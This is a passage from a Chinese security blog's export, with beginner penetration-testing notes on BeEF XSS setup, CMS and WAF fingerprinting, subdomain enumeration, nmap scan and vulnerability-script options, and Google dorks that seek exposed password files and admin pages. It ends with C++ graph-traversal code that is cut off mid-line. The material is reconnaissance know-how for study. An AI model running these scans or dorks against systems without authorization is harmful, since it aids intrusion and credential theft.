    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="beef-Xss"><a href="#beef-Xss" class="headerlink" title="beef-Xss"></a>beef-Xss</h1><blockquote>
<ul>
<li>beef： http:// github.com/beefproject/beef</li>
<li>vim /etc/beef-xss/config.yaml 修改配置文件<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210615190716808.png" alt="image-20210615190716808"></li>
</ul>
</li>
<li>beef-xss启动<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210615190818323.png" alt="image-20210615190818323"></li>
</ul>
</li>
</ul>
<ul>
<li><a href="http://192.168.136.134:3000/demos/butcher/index.html" target="_blank" rel="noopener">http://192.168.136.134:3000/demos/butcher/index.html</a><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210615190841239.png" alt="image-20210615190841239"></li>
</ul>
</li>
<li><a href="http://192.168.136.134:3000/ui/panel" target="_blank" rel="noopener">http://192.168.136.134:3000/ui/panel</a><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210615190856360.png" alt="image-20210615190856360"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210615191306116.png" alt="image-20210615191306116"></li>
</ul>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>黑客工具</tag>
        <tag>XSS</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息收集】CMS指纹识别</title>
    <url>/posts/74.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CMS指纹识别"><a href="#CMS指纹识别" class="headerlink" title="CMS指纹识别"></a>CMS指纹识别</h1><blockquote>
<p>查找环境 ： <a href="http://59.63.200.79:8803/" target="_blank" rel="noopener">http://59.63.200.79:8803/</a></p>
<p>快速二次开发的web应用框架</p>
<ul>
<li>1、唯一性</li>
<li>2、方便性</li>
<li>3、终身不变性</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210615104907533.png" alt="image-20210615104907533"></p>
<blockquote>
<p><strong>在线和离线的方式收集指纹信息</strong></p>
<ul>
<li><p><strong>1、云悉在线： <a href="http://www.yunsee.cn" target="_blank" rel="noopener">http://www.yunsee.cn</a></strong></p>
</li>
<li><p><strong>2、Whatweb：<a href="http://www.whatweb.net" target="_blank" rel="noopener">http://www.whatweb.net</a></strong></p>
<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210615105840106.png" alt="image-20210615105840106"></li>
</ul>
</li>
<li><p><strong>3、插件-wappalyer：<a href="https://www.wappalyzer.com/" target="_blank" rel="noopener">https://www.wappalyzer.com/</a></strong></p>
<ul>
<li><p><strong>谷歌插件搬运工：<a href="https://chrome.zzzmh.cn/info?token=gppongmhjkpfnbhagpmjfkannfbllamg" target="_blank" rel="noopener">https://chrome.zzzmh.cn/info?token=gppongmhjkpfnbhagpmjfkannfbllamg</a></strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210615112249180.png" alt="image-20210615112249180"></p>
</li>
</ul>
</li>
<li><p>4、<strong>脚本CMSeek：<a href="http://github.com/Tuhinshubhra/CMSeek" target="_blank" rel="noopener">http://github.com/Tuhinshubhra/CMSeek</a></strong></p>
<ul>
<li><strong>git clone <a href="https://github.com/Tuhinshubhra/CMSeeK" target="_blank" rel="noopener">https://github.com/Tuhinshubhra/CMSeeK</a></strong></li>
<li><strong>cd CMSeek</strong></li>
<li><strong>pip3 install -r requirements.txt</strong></li>
<li><strong>python3 cmseek.py -u <a href="http://59.63.200.79:8803/" target="_blank" rel="noopener">http://59.63.200.79:8803/</a></strong>   </li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210615112846889.png" alt="image-20210615112846889"></li>
</ul>
</li>
<li><p><strong>5、Webfinger：<a href="http://github.com/se55i0n/Webfinger" target="_blank" rel="noopener">http://github.com/se55i0n/Webfinger</a></strong></p>
</li>
</ul>
</blockquote>
<h1 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h1><blockquote>
<p><strong>常见的WAF产品以及检测方法</strong></p>
<ul>
<li><strong>1、Awesome-WAF项目</strong><ul>
<li><strong><a href="http://github.com/0xlnfection/Awesome-WAF" target="_blank" rel="noopener">http://github.com/0xlnfection/Awesome-WAF</a></strong></li>
</ul>
</li>
<li><strong>2、检测脚本：wafw00f</strong><ul>
<li><strong><a href="http://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">http://github.com/EnableSecurity/wafw00f</a></strong><ul>
<li><strong>git clone <a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a></strong></li>
<li><strong>python setup.py install</strong></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210615114439982.png" alt="image-20210615114439982"></li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="内容分发网CDN"><a href="#内容分发网CDN" class="headerlink" title="内容分发网CDN"></a>内容分发网CDN</h1><blockquote>
<p>CDN全称Content Delivery Network，内容分发网络。</p>
<ul>
<li>国内在线 CDN云观测： <a href="http://cdn.chinaz.com/" target="_blank" rel="noopener">http://cdn.chinaz.com/</a></li>
<li>国外在线 cdnplanet ：  <a href="https://www.cdnplanet.com/" target="_blank" rel="noopener">https://www.cdnplanet.com/</a></li>
<li>脚本canteen：xcdn ： <a href="https://github.com/3xp10it/xcdn" target="_blank" rel="noopener">https://github.com/3xp10it/xcdn</a></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210615120512907.png" alt="image-20210615120512907"></p>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>渗透测试工具</tag>
        <tag>信息收集</tag>
        <tag>指纹识别</tag>
        <tag>CMS</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息收集】子域名收集和目录扫描</title>
    <url>/posts/80.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="子域名收集的作用"><a href="#子域名收集的作用" class="headerlink" title="子域名收集的作用"></a>子域名收集的作用</h1><blockquote>
<ul>
<li>扩大渗透测试的范围</li>
<li>找到目标站点突破口</li>
<li>业务边界安全</li>
</ul>
</blockquote>
<h1 id="收集子域名的方法"><a href="#收集子域名的方法" class="headerlink" title="收集子域名的方法"></a>收集子域名的方法</h1><blockquote>
<ul>
<li>在线收集子域名<ul>
<li>通过特定谷歌语法查询子域名：site: qq.com</li>
<li>在线枚举爆破：<a href="http://phpinfo.me/domain" target="_blank" rel="noopener">http://phpinfo.me/domain</a></li>
<li>基于SSL证书查询子域：<a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a></li>
<li>基于DNS记录查找子域名：<a href="https://dns.bufferover.run/dns?q=zkaq.cnu.com" target="_blank" rel="noopener">https://dns.bufferover.run/dns?q=zkaq.cnu.com</a></li>
</ul>
</li>
<li>Fuzzdomain工具:使用git clone <a href="https://github.com/aboul3la/sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/sublist3r</a><ul>
<li>安装模块： sudo pip install -r requirements.txt</li>
<li><img src="https://img-blog.csdnimg.cn/img_convert/66a598dd0f655a3e3ff31e63f3e85713.png" alt="image-20210615083703485"></li>
<li>枚举目标子域 <strong>python2 sublist3r.py -d zkaq.org</strong></li>
<li>枚举子域名并且显示开放80和443端口的子域： <strong>python2 sublist3r.py -d zkaq.cn -p 80,443</strong><ul>
<li><img src="https://img-blog.csdnimg.cn/img_convert/93ba26156386cb6251725ffa09f3c8f2.png" alt="image-20210615094546932"></li>
</ul>
</li>
<li>保存 <strong>python2 sublist3r.py -d zkaq.cn -o zkaq.txt</strong></li>
</ul>
</li>
<li>用户事件<ul>
<li>历史漏洞 ： 乌云镜像：<a href="https://www.anquan.us" target="_blank" rel="noopener">https://www.anquan.us</a></li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="使用御剑扫描敏感目录"><a href="#使用御剑扫描敏感目录" class="headerlink" title="使用御剑扫描敏感目录"></a>使用御剑扫描敏感目录</h1><blockquote>
<ul>
<li><p><strong>御剑</strong>：一个比较好的后台扫描工具</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/fee730cd34b81c16f2b7d3fdb4d34589.png" alt="image-20210615095502128"></p>
</li>
</ul>
</blockquote>
<h1 id="常见的目录信息泄露"><a href="#常见的目录信息泄露" class="headerlink" title="常见的目录信息泄露"></a>常见的目录信息泄露</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/e2d4889a2729382fc3300c243ec017aa.png" alt="image-20210615103150633"></p>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>渗透测试工具</tag>
        <tag>信息收集</tag>
        <tag>子域名</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息收集工具】Nmap基础使用</title>
    <url>/posts/76.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Nmap常用扫描指令"><a href="#Nmap常用扫描指令" class="headerlink" title="Nmap常用扫描指令"></a>Nmap常用扫描指令</h1><h2 id="Nmap下载"><a href="#Nmap下载" class="headerlink" title="Nmap下载"></a>Nmap下载</h2><blockquote>
<p>官网：nmap.org</p>
<p>我的指令测试网站（大家都可以进）：<a href="http://59.63.200.79:8802/" target="_blank" rel="noopener">http://59.63.200.79:8802/</a></p>
</blockquote>
<h2 id="常用的端口扫描指令"><a href="#常用的端口扫描指令" class="headerlink" title="常用的端口扫描指令"></a>常用的端口扫描指令</h2><blockquote>
<ul>
<li><strong>如果是超级用户，无参数扫描等价于sS参数扫描</strong></li>
<li><strong>否则，无参数扫描等价于sT参数扫描（TCP，完整连接）</strong></li>
<li><strong>-sS： TCP SYN 扫描</strong><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210614201038985.png" alt="image-20210614201038985"></li>
</ul>
</li>
<li><strong>-p : 指定端口号扫描</strong><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210614200448662.png" alt="image-20210614200448662"></li>
</ul>
</li>
<li><strong>-v ： 显示扫描过程</strong><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210614200609830.png" alt="image-20210614200609830"></li>
</ul>
</li>
<li><strong>-F：快速扫描</strong><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210614201433133.png" alt="image-20210614201433133"></li>
</ul>
</li>
<li><strong>-Pn ： 禁止ping后扫描 –&gt;跳过主机发现的过程进行端口扫描</strong><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210614201507962.png" alt="image-20210614201507962"></li>
</ul>
</li>
<li><strong>-A: 全面的系统扫描：包括打开操作系统探测、版本探测、脚本扫描、路径跟踪</strong><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210614201608967.png" alt="image-20210614201608967"></li>
</ul>
</li>
<li><strong>-sU:  UDP扫描</strong><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210614202002324.png" alt="image-20210614202002324"></li>
</ul>
</li>
<li><strong>-sT: TCP扫描</strong><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210614201858709.png" alt=""></li>
</ul>
</li>
<li><strong>-sV: 扫描系统版本和程序版本号检测</strong><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210614202024173.png" alt="image-20210614202024173"></li>
</ul>
</li>
<li><strong>–script=vuln : 全面漏洞扫描</strong><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210614202936594.png" alt="image-20210614202936594"></li>
</ul>
</li>
<li><strong>-n： 禁止反向域名解析</strong><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210614202428352.png" alt="image-20210614202428352"></li>
</ul>
</li>
<li><strong>-R：反向域名解析</strong><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210614202336984.png" alt="image-20210614202336984"></li>
</ul>
</li>
<li><strong>-6： 启动IPV6扫描</strong></li>
<li><strong>扫描指定ip开放端口</strong><ul>
<li>nmap -sS -p 80 -v 59.63.200.79<ul>
<li>穿透防火墙扫描 nmap -Pn -A 59.63.200.79  –&gt;服务器禁止ping命令 就使用<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210614200903852.png" alt="image-20210614200903852"></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="Nmap扫描状态"><a href="#Nmap扫描状态" class="headerlink" title="Nmap扫描状态"></a>Nmap扫描状态</h1><blockquote>
<ul>
<li><strong>Opend：端口开启</strong></li>
<li><strong>Closed：端口关闭</strong></li>
<li><strong>Filtered：端口被过滤，数据没有到达主机</strong></li>
<li><strong>Unfilered：未被过滤，数据有到达主机，不能识别端口当前状态</strong></li>
<li><strong>Open | filtered： 开放或者被过滤，端口没有返回值，主要发生在UDP、IP、FIN、NULL和Xmas扫描中</strong></li>
<li><strong>Closed | filtered： 关闭或者被过滤，只发生在IP iD idle扫描</strong></li>
</ul>
</blockquote>
<h1 id="Nmap漏洞扫描"><a href="#Nmap漏洞扫描" class="headerlink" title="Nmap漏洞扫描"></a>Nmap漏洞扫描</h1><blockquote>
<ul>
<li><strong>使用Nmap中的脚本进行信息收集</strong><ul>
<li>whois 信息  <ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210614205814016.png" alt="image-20210614205814016"></li>
<li>nmap –script=whois-domain zkaq.cn</li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210614205108905.png" alt="image-20210614205108905"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210614205059280.png" alt="image-20210614205059280"></li>
<li>脚本路径 /usr/share/nmap/scripts/<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210614205009260.png" alt="image-20210614205009260"></li>
</ul>
</li>
</ul>
</li>
<li>DNS解析查询<ul>
<li>使用DNS爆破脚本进行dns解析扫描 <strong>nmap –script=dns-brute zkaq.cn</strong></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210614205840977.png" alt="image-20210614205840977"></li>
<li>nmap –script=dns -brute zkaq.cn</li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210614210137975.png" alt="image-20210614210137975"></li>
</ul>
</li>
</ul>
</li>
<li><strong>nmap官方脚本</strong><ul>
<li><a href="https://svn.nmap.org/nmap/scripts/" target="_blank" rel="noopener">https://svn.nmap.org/nmap/scripts/</a></li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="Nmap报告输出"><a href="#Nmap报告输出" class="headerlink" title="Nmap报告输出"></a>Nmap报告输出</h1><blockquote>
<ul>
<li>把Nmap扫描结果保存到本地<ul>
<li>标准保存<ul>
<li>nmap -oN test.txt zkaq.cn   –&gt; outName缩写oN</li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210614213142905.png" alt="image-20210614213142905"></li>
</ul>
</li>
<li>保存为xml格式<ul>
<li>nmap -oX test .xml zkaq.cn  –&gt; outXml缩写oX</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>渗透测试工具</tag>
        <tag>信息收集</tag>
        <tag>Nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息收集】Google hack语法基础</title>
    <url>/posts/78.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="搜索引擎-amp-amp-Google-hack语法"><a href="#搜索引擎-amp-amp-Google-hack语法" class="headerlink" title="搜索引擎 &amp;&amp; Google hack语法"></a>搜索引擎 &amp;&amp; Google hack语法</h1><h2 id="信息搜集的作用"><a href="#信息搜集的作用" class="headerlink" title="信息搜集的作用"></a>信息搜集的作用</h2><h3 id="为什么要进行信息收集"><a href="#为什么要进行信息收集" class="headerlink" title="为什么要进行信息收集"></a>为什么要进行信息收集</h3><blockquote>
<ul>
<li>获得信息</li>
<li>了解对方</li>
<li>掌握情况</li>
<li>寻找弱点</li>
<li>安全短板</li>
</ul>
</blockquote>
<h3 id="信息搜集的内容"><a href="#信息搜集的内容" class="headerlink" title="信息搜集的内容"></a>信息搜集的内容</h3><blockquote>
<p>针对目标系统所相关的信息</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210614181353352.png" alt="image-20210614181353352"></p>
</blockquote>
<h2 id="传统搜索引擎"><a href="#传统搜索引擎" class="headerlink" title="传统搜索引擎"></a>传统搜索引擎</h2><blockquote>
<p><strong>传统搜索引擎有效的抓取对方网站页面内容</strong></p>
<ul>
<li>公司动态</li>
<li>组织文档</li>
<li>用户名/密码</li>
<li>测试文件</li>
<li>历史数据</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">传统搜索引擎针对网页内容以及网页标题等相关信息进行抓取，提供给我们进行查阅</span><br></pre></td></tr></table></figure></div>

<h2 id="Google-hack语法"><a href="#Google-hack语法" class="headerlink" title="Google hack语法"></a>Google hack语法</h2><blockquote>
<p>常见的Google语法，帮助我们缩小范围</p>
<ul>
<li><p>site：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>  –&gt;搜索范围限制在某网站或顶级域名中。</p>
</li>
<li><p>inurl: php?id=1  –&gt;Google会返回那些在URL里面包含了我们查询关键词的网页</p>
</li>
<li><p>intext:后台 –&gt;当我们用intext进行查询的时候，Google会返回那些在文本正文里面包含我们查询关键词的网页。</p>
</li>
<li><p>intitle: 登陆系统 –&gt; Google会返回那些在网页标题为查询结果</p>
<p><strong>例子</strong></p>
</li>
<li><p>inurl: /admin/login.php</p>
</li>
<li><p>inurl: qq.txt</p>
</li>
<li><p>filetype: xls “username | password”</p>
</li>
<li><p>intext: password “Login info” filetype:txt</p>
</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">扩展思路：白帽子提供google搜索方法语法</span><br><span class="line">https:&#x2F;&#x2F;www.exploit-db.com&#x2F;google-hacking-database</span><br></pre></td></tr></table></figure></div>

<h2 id="网络空间引擎"><a href="#网络空间引擎" class="headerlink" title="网络空间引擎"></a>网络空间引擎</h2><blockquote>
<p><strong>基于物联网搜索，搜索联网的网络设备</strong></p>
<ul>
<li>钟馗之眼 - <a href="http://www.zoomeye.org" target="_blank" rel="noopener">http://www.zoomeye.org</a></li>
<li>Shodan  - <a href="https://www.shodan.io" target="_blank" rel="noopener">https://www.shodan.io</a></li>
<li>fofa        - <a href="https://fofa.so" target="_blank" rel="noopener">https://fofa.so</a></li>
<li>傻蛋       - <a href="https://www.oshadan.com" target="_blank" rel="noopener">https://www.oshadan.com</a></li>
<li>Dnsdb搜索 -<a href="https://www.dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://www.dnsdb.io/zh-cn/</a></li>
</ul>
</blockquote>
<blockquote>
<p><strong>精细化搜索</strong></p>
<ul>
<li>微信公众号 <a href="https://weixin.sogou.com" target="_blank" rel="noopener">https://weixin.sogou.com</a>  <strong>比如孤桜懶契</strong></li>
<li>知乎相关 <a href="https://www.zhibu.com/search?q=" target="_blank" rel="noopener">https://www.zhibu.com/search?q=</a></li>
<li>微博相关 <a href="https://s.weibo.com/?Refer=" target="_blank" rel="noopener">https://s.weibo.com/?Refer=</a></li>
<li>购物 <a href="https://search.jd.com/search?enc=utf-8&amp;keyword" target="_blank" rel="noopener">https://search.jd.com/search?enc=utf-8&amp;keyword</a>:</li>
<li>github <a href="https://github.com/search?q=" target="_blank" rel="noopener">https://github.com/search?q=</a></li>
<li>贴吧<a href="https://tieba.baidu.com/f/search/res?qw=" target="_blank" rel="noopener">https://tieba.baidu.com/f/search/res?qw=</a></li>
</ul>
</blockquote>
<p><strong>欢迎来到我的博客<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></strong></p>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
        <tag>渗透测试基础</tag>
        <tag>Google hack语法</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息收集】基础模板</title>
    <url>/posts/79.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="信息收集整理"><a href="#信息收集整理" class="headerlink" title="信息收集整理"></a>信息收集整理</h1><h2 id="目标事件"><a href="#目标事件" class="headerlink" title="目标事件"></a>目标事件</h2><blockquote>
<ul>
<li>历史漏洞</li>
<li>使用手册</li>
<li>手机APP</li>
<li>小程序</li>
</ul>
</blockquote>
<h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><blockquote>
<ul>
<li>子域名</li>
<li>证书</li>
</ul>
</blockquote>
<h2 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h2><blockquote>
<ul>
<li>php</li>
<li>jsp</li>
<li>asp</li>
<li>aspx</li>
</ul>
</blockquote>
<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><blockquote>
<ul>
<li>mysql</li>
<li>mssql</li>
<li>oracle</li>
</ul>
</blockquote>
<h2 id="目录爬行"><a href="#目录爬行" class="headerlink" title="目录爬行"></a>目录爬行</h2><blockquote>
<ul>
<li><p>目录遍历</p>
</li>
<li><p>目录文件</p>
</li>
</ul>
</blockquote>
<h2 id="目录浏览"><a href="#目录浏览" class="headerlink" title="目录浏览"></a>目录浏览</h2><blockquote>
<ul>
<li>君子协议 robots.txt</li>
<li>目录地址 - 登陆</li>
<li>框架所开发的路由</li>
</ul>
</blockquote>
<h2 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h2><blockquote>
<ul>
<li>.svn</li>
<li>.git</li>
<li>备份文件</li>
</ul>
</blockquote>
<h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><blockquote>
<ul>
<li><p>IIS</p>
</li>
<li><p>apache</p>
</li>
<li><p>nginx</p>
</li>
</ul>
</blockquote>
<p>服务器系统</p>
<blockquote>
<ul>
<li><p>windows</p>
</li>
<li><p>linux</p>
</li>
</ul>
</blockquote>
<h2 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h2><blockquote>
<ul>
<li><p>阿里云</p>
</li>
<li><p>西部数码</p>
</li>
<li><p>传送域漏洞</p>
</li>
</ul>
</blockquote>
<h2 id="cms"><a href="#cms" class="headerlink" title="cms"></a>cms</h2><blockquote>
<ul>
<li><p>dedecms</p>
</li>
<li><p>wordpress</p>
</li>
</ul>
</blockquote>
<h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><blockquote>
<ul>
<li>thinkphp</li>
<li>struts2</li>
</ul>
</blockquote>
<h2 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h2><blockquote>
<ul>
<li>HTTP:80</li>
<li>FTP:21</li>
<li>mysql 3306</li>
</ul>
</blockquote>
<h2 id="目标IP"><a href="#目标IP" class="headerlink" title="目标IP"></a>目标IP</h2><blockquote>
<ul>
<li>阿里云</li>
<li>历史解析</li>
<li>超级ping</li>
</ul>
</blockquote>
<h2 id="C段地址"><a href="#C段地址" class="headerlink" title="C段地址"></a>C段地址</h2><blockquote>
<ul>
<li>ip</li>
<li>域名</li>
</ul>
</blockquote>
<h2 id="idc"><a href="#idc" class="headerlink" title="idc"></a>idc</h2><blockquote>
<ul>
<li>阿里云</li>
</ul>
</blockquote>
<h2 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h2><blockquote>
<ul>
<li>云盾</li>
<li>云锁</li>
<li>安全狗</li>
<li>安全卫士</li>
</ul>
</blockquote>
<h2 id="图床"><a href="#图床" class="headerlink" title="图床"></a>图床</h2><blockquote>
<ul>
<li><p>七牛云</p>
</li>
<li><p>阿里云</p>
</li>
</ul>
</blockquote>
<h2 id="安全措施"><a href="#安全措施" class="headerlink" title="安全措施"></a>安全措施</h2><blockquote>
<ul>
<li>自定义404、伪静态处理、流量防护登</li>
<li>cdn<ul>
<li>白盾云大俗</li>
<li>加速乐</li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="第三方资源引用"><a href="#第三方资源引用" class="headerlink" title="第三方资源引用"></a>第三方资源引用</h2><blockquote>
<ul>
<li><p>SDK</p>
</li>
<li><p>js</p>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
        <tag>渗透测试基础</tag>
      </tags>
  </entry>
  <entry>
    <title>[VC]无向图遍历（邻接矩阵和邻接表）</title>
    <url>/posts/85.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="C-图遍历完整代码-无向（邻接矩阵和邻接表）"><a href="#C-图遍历完整代码-无向（邻接矩阵和邻接表）" class="headerlink" title="[C]图遍历完整代码-无向（邻接矩阵和邻接表）"></a>[C]图遍历完整代码-无向（邻接矩阵和邻接表）</h1><h2 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h2><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210613205513948.png" alt="image-20210613205513948"></p>
<h2 id="完整代码奉上"><a href="#完整代码奉上" class="headerlink" title="完整代码奉上"></a>完整代码奉上</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MaxVertexNum 100 <span class="comment">//定义最大顶点数</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//=========定义标志向量，为全局变量=======</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;FALSE,TRUE&#125; Boolean;</span><br><span class="line"></span><br><span class="line">Boolean visited[MaxVertexNum];</span><br><span class="line"></span><br><span class="line"><span class="comment">//*********************基于邻接矩阵图遍历*********************</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> vexs[MaxVertexNum];  <span class="comment">//顶点表</span></span><br><span class="line">	<span class="keyword">int</span> edges[MaxVertexNum][MaxVertexNum]; <span class="comment">//邻接矩阵，就是列和行</span></span><br><span class="line">	<span class="keyword">int</span> n,e; <span class="comment">//图中的顶点数n和边数e</span></span><br><span class="line">&#125;MGraph; <span class="comment">//Adjacency Matrix(邻接矩阵)表示的图的类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//=========建立无向邻接矩阵========</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateMGraph</span><span class="params">(MGraph *G)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,k;</span><br><span class="line">	<span class="keyword">char</span> a;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"(输入顶点和边：)input VertexNum(n) and EdgesNum(e):"</span>;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;G-&gt;n&gt;&gt;G-&gt;e; <span class="comment">//输入顶点数和边数</span></span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"Input Vertx string : "</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;G-&gt;n; i++) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;a;  </span><br><span class="line">		G-&gt;vexs[i]=a; <span class="comment">//读入顶点信息，建立定点表</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;G-&gt;n; i++)</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;G-&gt;n; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			G-&gt;edges[i][j]=<span class="number">0</span>;  <span class="comment">//初始化邻接矩阵</span></span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"Input edges, Create Adjacency Matrix :"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">for</span>(k=<span class="number">0</span>; k&lt;G-&gt;e; k++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;i&gt;&gt;j;  <span 